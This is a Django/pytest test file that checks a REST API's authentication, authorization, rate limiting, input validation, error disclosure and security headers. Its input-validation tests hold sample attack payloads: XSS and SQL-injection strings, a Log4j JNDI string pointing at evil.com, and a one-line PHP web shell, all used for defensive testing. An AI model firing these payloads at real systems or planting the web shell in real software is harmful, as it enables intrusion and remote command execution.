"""API Security Tests - Test REST API security measures."""

import pytest
import json
import time
from django.test import TestCase, Client
from django.contrib.auth.models import User
from django.urls import reverse
from rest_framework.test import APIClient
from rest_framework import status


class TestAPIAuthentication(TestCase):
    """Test API authentication mechanisms."""
    
    def setUp(self):
        self.client = APIClient()
        self.user = User.objects.create_user(
            username='testuser',
            email='test@example.com',
            password='SecurePass123!'
        )
    
    def test_unauthenticated_access_denied(self):
        """Test that unauthenticated requests are denied."""
        # Test various API endpoints without authentication
        endpoints = [
            '/api/workbooks/',
            '/api/workbooks/1/',
            '/api/users/',
        ]
        
        for endpoint in endpoints:
            response = self.client.get(endpoint)
            self.assertIn(response.status_code, [401, 403, 404], 
                         f"Endpoint {endpoint} should require authentication")
    
    def test_token_authentication(self):
        """Test token-based authentication."""
        # Test that valid tokens work
        self.client.force_authenticate(user=self.user)
        
        # This should work with authentication
        response = self.client.get('/api/workbooks/')
        self.assertNotEqual(response.status_code, 401)
    
    def test_invalid_token_rejected(self):
        """Test that invalid tokens are rejected."""
        # Test with invalid token format
        self.client.credentials(HTTP_AUTHORIZATION='Bearer invalid_token_here')
        
        response = self.client.get('/api/workbooks/')
        self.assertIn(response.status_code, [401, 403], 
                     "Invalid token should be rejected")


class TestAPIAuthorization(TestCase):
    """Test API authorization controls."""
    
    def setUp(self):
        self.client = APIClient()
        self.regular_user = User.objects.create_user(
            username='regular', password='pass123'
        )
        self.admin_user = User.objects.create_user(
            username='admin', password='pass123', is_staff=True
        )
    
    def test_user_data_isolation(self):
        """Test that users can only access their own data."""
        # This test assumes workbooks are user-specific
        # Create test data for different users
        
        # Regular user should only see their data
        self.client.force_authenticate(user=self.regular_user)
        response = self.client.get('/api/workbooks/')
        
        if response.status_code == 200:
            # Should not see other users' data
            pass  # Implementation depends on actual API structure
    
    def test_admin_access_controls(self):
        """Test admin access controls."""
        # Admin should have broader access
        self.client.force_authenticate(user=self.admin_user)
        
        # Admin endpoints should be accessible
        admin_endpoints = [
            '/admin/auth/user/',
        ]
        
        for endpoint in admin_endpoints:
            response = self.client.get(endpoint)
            # Should not be forbidden for admin
            self.assertNotEqual(response.status_code, 403)


class TestAPIRateLimiting(TestCase):
    """Test API rate limiting."""
    
    def setUp(self):
        self.client = APIClient()
        self.user = User.objects.create_user(
            username='testuser', password='pass123'
        )
        self.client.force_authenticate(user=self.user)
    
    def test_rate_limiting_exists(self):
        """Test that rate limiting is implemented."""
        # Make many requests quickly
        endpoint = '/api/workbooks/'
        responses = []
        
        for i in range(20):  # Make 20 rapid requests
            response = self.client.get(endpoint)
            responses.append(response.status_code)
            time.sleep(0.1)  # Small delay
        
        # Check if any requests were rate limited (429 status)
        rate_limited = any(status == 429 for status in responses)
        
        # This is more of a documentation test - rate limiting implementation varies
        # In a real API, we'd expect 429 status codes after many rapid requests
        if not rate_limited:
            import warnings
            warnings.warn("No rate limiting detected - consider implementing rate limiting")


class TestAPIInputValidation(TestCase):
    """Test API input validation and sanitization."""
    
    def setUp(self):
        self.client = APIClient()
        self.user = User.objects.create_user(
            username='testuser', password='pass123'
        )
        self.client.force_authenticate(user=self.user)
    
    def test_malicious_json_input(self):
        """Test handling of malicious JSON input."""
        malicious_payloads = [
            {'name': '<script>alert("xss")</script>'},
            {'name': '"; DROP TABLE workbooks; --'},
            {'name': '${jndi:ldap://evil.com/exploit}'},  # Log4j style
            {'description': '\x00\x01\x02\x03'},  # Control characters
            {'large_field': 'A' * 10000},  # Very large input
        ]
        
        for payload in malicious_payloads:
            response = self.client.post('/api/workbooks/', 
                                      json.dumps(payload),
                                      content_type='application/json')
            
            # Should not result in server error
            self.assertNotEqual(response.status_code, 500, 
                              f"Server error on malicious input: {payload}")
            
            # Should likely be rejected with 400 Bad Request
            if response.status_code == 201:  # Created successfully
                # If accepted, verify the data was sanitized
                response_data = response.json() if response.content else {}
                if 'name' in response_data:
                    self.assertNotIn('<script>', response_data['name'])
                    self.assertNotIn('DROP TABLE', response_data['name'])
    
    def test_sql_injection_prevention(self):
        """Test SQL injection prevention in API endpoints."""
        # Test SQL injection in URL parameters
        sql_payloads = [
            "1' OR '1'='1",
            "'; DROP TABLE workbooks; --",
            "1 UNION SELECT * FROM users--",
        ]
        
        for payload in sql_payloads:
            # Test in various URL parameters
            response = self.client.get(f'/api/workbooks/?search={payload}')
            
            # Should not result in server error
            self.assertNotEqual(response.status_code, 500)
    
    def test_file_upload_security(self):
        """Test file upload security."""
        # Test various malicious file uploads
        malicious_files = [
            ('malware.exe', b'MZ\x90\x00'),  # PE executable
            ('script.php', b'<?php system($_GET["cmd"]); ?>'),  # PHP script
            ('large_file.txt', b'A' * (10 * 1024 * 1024)),  # 10MB file
        ]
        
        for filename, content in malicious_files:
            response = self.client.post('/api/workbooks/upload/', {
                'file': content,
                'filename': filename
            })
            
            # Should reject dangerous files
            if response.status_code == 201:  # If accepted
                import warnings
                warnings.warn(f"Potentially dangerous file accepted: {filename}")


class TestAPIErrorHandling(TestCase):
    """Test API error handling security."""
    
    def setUp(self):
        self.client = APIClient()
    
    def test_error_information_disclosure(self):
        """Test that errors don't disclose sensitive information."""
        # Test various endpoints that might cause errors
        error_endpoints = [
            '/api/nonexistent/',
            '/api/workbooks/999999/',  # Non-existent ID
        ]
        
        for endpoint in error_endpoints:
            response = self.client.get(endpoint)
            
            if response.content:
                content = response.content.decode().lower()
                
                # Check that error messages don't reveal sensitive info
                sensitive_keywords = [
                    'database',
                    'password',
                    'secret',
                    'key',
                    'token',
                    'traceback',
                    'file path',
                    '/home/',
                    'c:\\',
                ]
                
                for keyword in sensitive_keywords:
                    self.assertNotIn(keyword, content, 
                                   f"Error response contains sensitive info: {keyword}")
    
    def test_debug_mode_disabled(self):
        """Test that debug mode is disabled in production-like settings."""
        from django.conf import settings
        
        # Make a request that would trigger debug info
        response = self.client.get('/api/definitely-nonexistent-endpoint/')
        
        # In production, should not see Django debug pages
        if response.content:
            content = response.content.decode()
            debug_indicators = [
                'Django Debug',
                'Traceback',
                'Request information',
                'Settings',
            ]
            
            for indicator in debug_indicators:
                if indicator in content and hasattr(settings, 'DEBUG') and settings.DEBUG:
                    import warnings
                    warnings.warn("Debug mode appears to be enabled")


class TestAPISecurityHeaders(TestCase):
    """Test API security headers."""
    
    def setUp(self):
        self.client = APIClient()
    
    def test_security_headers_present(self):
        """Test that security headers are present in API responses."""
        response = self.client.get('/api/')
        
        # Important security headers for APIs
        expected_headers = [
            'X-Content-Type-Options',
            'X-Frame-Options', 
            'X-XSS-Protection',
        ]
        
        for header in expected_headers:
            if header not in response.headers:
                import warnings
                warnings.warn(f"Missing security header: {header}")
    
    def test_cors_configuration(self):
        """Test CORS configuration security."""
        # Test CORS headers
        response = self.client.options('/api/workbooks/')
        
        if 'Access-Control-Allow-Origin' in response.headers:
            origin = response.headers['Access-Control-Allow-Origin']
            
            # Should not allow all origins in production
            if origin == '*':
                import warnings
                warnings.warn("CORS allows all origins - security risk")